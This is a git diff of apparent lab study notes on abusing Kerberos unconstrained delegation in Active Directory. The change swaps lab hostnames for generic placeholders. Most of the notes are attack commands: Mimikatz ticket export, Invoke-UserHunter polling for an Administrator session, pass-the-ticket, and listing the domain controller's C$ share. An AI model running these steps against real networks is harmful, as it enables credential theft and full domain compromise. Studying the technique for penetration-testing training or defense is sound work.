@@ -6,18 +6,18 @@ Get-NetComputer -UnConstrained
 
 -Compromise the server(s) where Unconstrained delgation is enabled.
 
---run as the user with admin privileges on one of the computer found in get-netcomputer -unconstrained (appsrv - PTH as appadmin)
+--run as the user with admin privileges on one of the computer found in get-netcomputer -unconstrained (computername - PTH as local admin there)
 
 ---Find-LocalAdminAccess (it'll find to appsrv which is a computer with unconstrained delegation enabled)
 
----Enter the appsrv session (unconstrained delegation enabled computer)
+---Enter the computername session (unconstrained delegation enabled computer)
 
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
--not on appsrv
+-not on target computer (unconstrained delegated)
 
-Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5
+Invoke-UserHunter -ComputerName subdomain-unconstrainedDelegatedComputer -Poll 100 -UserName Administrator -Delay 5
 
 Invoke-Mimikatz -Command '"kerberos::ptt ticket-Administrator@krbtgt"'
 
-ls \\dcorp-dc.dollarcorp.moneycorp.local\c$ can be accessible
+ls \\subdomain-dc.subdomain.domain.local\c$ can be accessible
